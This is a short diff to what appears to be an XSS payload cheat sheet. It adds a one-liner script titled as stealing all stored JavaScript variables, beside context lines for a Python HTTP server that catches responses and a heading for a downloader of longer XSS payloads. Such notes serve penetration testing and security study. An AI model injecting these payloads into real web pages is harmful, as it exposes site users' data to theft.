@@ -50,6 +50,11 @@ Setup http server to catch responses:
 python3 -m http.server -m 80
 ```
 
+### One Liner to steal all stored js variables
+
+```
+<script>for(var p in window) window.hasOwnProperty(p)&&"function"!=typeof window[p]&&console.log(p+": "+window[p])</script>
+```
 
 ### Downloader for longer XSS payloads
 ```
